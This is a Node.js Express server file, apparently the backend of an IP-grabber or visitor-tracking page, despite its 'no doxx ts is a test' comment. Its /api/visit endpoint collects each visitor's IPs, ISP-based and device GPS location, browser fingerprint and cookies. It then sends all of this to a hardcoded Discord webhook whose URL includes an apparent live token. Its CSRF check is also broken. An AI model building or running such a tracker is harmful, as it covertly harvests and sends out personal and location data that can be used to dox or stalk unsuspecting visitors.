// don't take it srsly guys
// no doxx ts is a test :)
const express = require('express');
const cors = require('cors');
const useragent = require('useragent');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');
const winston = require('winston');
const cookieParser = require('cookie-parser');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 10000;

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'logs/visitor.log' }),
    new winston.transports.Console()
  ]
});

app.use(cors({
  origin: 'https://vanprojects.netlify.app',
  credentials: true
}));
app.use(express.json());
app.use(cookieParser());
app.use((req, res, next) => {
  req.sessionId = req.headers['x-session-id'] || uuidv4();
  res.setHeader('X-Session-ID', req.sessionId);
  req.csrfToken = () => uuidv4();
  const token = req.csrfToken();
  res.setHeader('X-CSRF-Token', token);
  logger.info('Generated CSRF token', { sessionId: req.sessionId, csrfToken: token });
  next();
});

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use(limiter);

function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'] || req.ip;
  const ipList = forwarded.split(',').map(ip => ip.trim()).concat('::1');
  return { primary: ipList[0], all: ipList };
}

app.get('/csrf-token', (req, res) => {
  const token = req.csrfToken();
  logger.info('Served CSRF token', { token, sessionId: req.sessionId });
  res.json({ csrfToken: token });
});

const csrfMiddleware = (req, res, next) => {
  const csrfToken = req.headers['x-csrf-token'];
  if (!csrfToken || csrfToken !== req.csrfToken()) {
    logger.warn('CSRF Attack Detected', { ip: getClientIP(req).primary });
    return res.status(403).send('Invalid CSRF token');
  }
  next();
};

app.post('/api/visit', csrfMiddleware, async (req, res) => {
  try {
    const clientIP = getClientIP(req);
    logger.info('Detected IPs', { primary: clientIP.primary, all: clientIP.all });

    const ipData = await fetch(`http://ip-api.com/json/${clientIP.primary}?fields=66846719`).then(res => res.json());
    const { country, regionName, city, zip, lat, lon, isp, org, as, mobile, proxy, hosting } = ipData.status === 'success' ? ipData : {};

    logger.info('Raw location data received:', { deviceLocation: req.body.loc });
    const visitorInfo = {
      ip: clientIP.primary,
      allIPs: clientIP.all,
      country: country || 'Unknown',
      region: regionName || 'Unknown',
      city: city || 'Unknown',
      zip: zip || 'Unknown',
      ipLatitude: lat || 0,
      ipLongitude: lon || 0,
      isp: isp || 'Unknown',
      organization: org || '',
      as: as || 'Unknown',
      mobile: mobile || false,
      proxy: proxy || false,
      hosting: hosting || false,
      deviceLocation: req.body.loc || { err: 'No location provided' },
      fallbackLocation: req.body.loc && !req.body.loc.err ? null : { latitude: lat || 0, longitude: lon || 0, source: 'IP-based' },
      sessionId: req.sessionId,
      browser: useragent.parse(req.headers['user-agent']).toAgent(),
      os: useragent.parse(req.headers['user-agent']).os.toString(),
      device: req.body.dev || 'Unknown',
      deviceType: useragent.parse(req.headers['user-agent']).device.toString(),
      userAgentRaw: req.headers['user-agent'],
      cookies: req.cookies || {},
      accept: req.headers.accept || 'Unknown',
      acceptLanguage: req.headers['accept-language'] || 'Unknown',
      referer: req.headers.referer || 'Unknown',
      requestPath: req.path,
      requestMethod: req.method,
      timestamp: req.body.ts || new Date().toISOString()
    };

    const threats = [];
    if (req.body.scrpt && req.body.scrpt.length > 0) {
      threats.push({ type: 'XSS', details: `Detected ${req.body.scrpt.length} inline scripts and cookie access: ${req.body.ck}` });
    }
    if (req.headers['x-forwarded-proto'] !== 'https') {
      threats.push({ type: 'MITM Risk', details: 'Insecure HTTP connection detected' });
    }

    logger.info('Visitor Info', { ...visitorInfo, threats });
    if (threats.length > 0) {
      logger.warn('Security Threats Detected', { visitorInfo, threats });
    }

    const webhookPayloads = [
      {
        embeds: [{
          title: 'Visitor Info (Part 1)',
          fields: [
            { name: 'Session ID', value: visitorInfo.sessionId, inline: true },
            { name: 'Device', value: visitorInfo.device, inline: true },
            { name: 'IP', value: visitorInfo.ip, inline: true },
            { name: 'All IPs', value: visitorInfo.allIPs.join(', '), inline: false },
            { name: 'Country', value: visitorInfo.country, inline: true },
            { name: 'Region', value: visitorInfo.region, inline: true },
            { name: 'City', value: visitorInfo.city, inline: true },
            { name: 'ZIP', value: visitorInfo.zip, inline: true },
            { name: 'IP-based Coordinates', value: `(${visitorInfo.ipLatitude}, ${visitorInfo.ipLongitude})`, inline: false }
          ],
          timestamp: visitorInfo.timestamp
        }]
      },
      {
        embeds: [{
          title: 'Visitor Info (Part 2)',
          fields: [
            { name: 'Device Location', value: visitorInfo.deviceLocation.err ? visitorInfo.deviceLocation.err : `(${visitorInfo.deviceLocation.lat}, ${visitorInfo.deviceLocation.lon}, Accuracy: ${visitorInfo.deviceLocation.acc}m)`, inline: false },
            { name: 'Fallback Location', value: visitorInfo.fallbackLocation ? `(${visitorInfo.fallbackLocation.latitude}, ${visitorInfo.fallbackLocation.longitude}, Source: ${visitorInfo.fallbackLocation.source})` : 'None', inline: false },
            { name: 'ISP', value: visitorInfo.isp, inline: true },
            { name: 'Organization', value: visitorInfo.organization || 'N/A', inline: true },
            { name: 'AS', value: visitorInfo.as, inline: true },
            { name: 'Mobile', value: visitorInfo.mobile ? 'Yes' : 'No', inline: true }
          ],
          timestamp: visitorInfo.timestamp
        }]
      },
      {
        embeds: [{
          title: 'Visitor Info (Part 3)',
          fields: [
            { name: 'Browser', value: visitorInfo.browser, inline: true },
            { name: 'OS', value: visitorInfo.os, inline: true },
            { name: 'Device Type', value: visitorInfo.deviceType, inline: true },
            { name: 'Accept', value: visitorInfo.accept, inline: true },
            { name: 'Accept Language', value: visitorInfo.acceptLanguage, inline: true },
            { name: 'Referer', value: visitorInfo.referer, inline: false },
            { name: 'Cookies', value: JSON.stringify(visitorInfo.cookies), inline: false }
          ],
          timestamp: visitorInfo.timestamp
        }]
      },
      {
        embeds: [{
          title: 'Visitor Info (Part 4)',
          fields: [
            { name: 'Screen Size', value: req.body.scr || 'Unknown', inline: true },
            { name: 'Color Depth', value: req.body.col || 'Unknown', inline: true },
            { name: 'Timezone', value: req.body.tz || 'Unknown', inline: true },
            { name: 'Language', value: req.body.lang || 'Unknown', inline: true },
            { name: 'Hardware Concurrency', value: req.body.hc || 'Unknown', inline: true },
            { name: 'Device Memory', value: req.body.mem || 'Unknown', inline: true },
            { name: 'Do Not Track', value: req.body.dnt || 'Unknown', inline: true }
          ],
          timestamp: visitorInfo.timestamp
        }]
      }
    ];

    for (let i = 0; i < webhookPayloads.length; i++) {
      const payload = webhookPayloads[i];
      logger.info(`Attempting to send to Discord Webhook (Part ${i + 1})`, { payloadSize: JSON.stringify(payload).length });
      await fetch('https://discord.com/api/webhooks/1423009299826868396/7ezGh2CAQRooHIvE5sXCBGW0AAgFE2Ku8aFqUDe2eqC2BG7quehvy6JBgWqSwfhrROAq', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).then(res => {
        logger.info(`Successfully sent to Discord Webhook (Part ${i + 1})`, { status: res.status });
      });
      await new Promise(resolve => setTimeout(resolve, 2000));
    }

    res.json({ status: 'success' });
  } catch (error) {
    logger.error('Error processing /api/visit', { error: error.message });
    res.status(500).send('Server error');
  }
});

app.listen(port, () => {
  logger.info(`Server running on port ${port}`);
});
